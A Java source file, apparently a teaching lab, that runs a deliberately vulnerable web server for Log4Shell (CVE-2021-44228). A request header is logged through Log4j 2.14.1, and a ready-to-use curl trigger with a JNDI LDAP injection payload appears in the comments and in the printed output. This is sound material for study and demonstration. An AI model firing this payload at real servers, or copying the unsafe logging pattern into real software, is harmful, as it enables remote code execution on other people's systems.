package demo;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;

/**
 * Educational demo — CVE-2021-44228 (Log4Shell).
 *
 * Simulates a web application that passes a user-controlled HTTP header
 * straight into Log4j 2.14.1.  Because Log4j performs JNDI lookups inside
 * log messages before 2.15.0, a crafted header value triggers an outbound
 * LDAP connection to the attacker-controlled server.
 *
 * Run:
 *   mvn exec:java -Dexec.mainClass=demo.VulnerableServer
 *
 * Trigger (while CallbackMonitor is running on port 1389):
 *   curl -H 'X-Api-Token: ${jndi:ldap://127.0.0.1:1389/exploit}' \
 *        http://localhost:8080/
 *
 * WARNING: intentionally vulnerable — never use Log4j 2.14.1 in production.
 */
public class VulnerableServer {

    private static final Logger log = LogManager.getLogger(VulnerableServer.class);
    private static final int PORT = 8080;

    public static void main(String[] args) throws IOException {
        HttpServer server = HttpServer.create(new InetSocketAddress(PORT), 0);
        server.createContext("/", VulnerableServer::handle);
        server.start();
        System.out.println("[VulnerableServer] Listening on http://localhost:" + PORT);
        System.out.println("[VulnerableServer] Send a crafted X-Api-Token header to trigger Log4Shell.");
        System.out.println("[VulnerableServer] Example:");
        System.out.println("  curl -H 'X-Api-Token: ${jndi:ldap://127.0.0.1:1389/exploit}' http://localhost:" + PORT + "/");
    }

    private static void handle(HttpExchange exchange) throws IOException {
        // A common real-world pattern: log a header for audit / debugging.
        // The vulnerability: Log4j 2.x evaluates ${...} expressions embedded
        // in log message strings, including JNDI lookups over LDAP/RMI/DNS.
        String token = exchange.getRequestHeaders().getFirst("X-Api-Token");
        if (token == null) token = "(none)";

        // *** VULNERABLE LINE — do not replicate in production ***
        log.info("Received request with token: {}", token);

        byte[] response = "OK\n".getBytes();
        exchange.sendResponseHeaders(200, response.length);
        try (OutputStream os = exchange.getResponseBody()) {
            os.write(response);
        }
    }
}
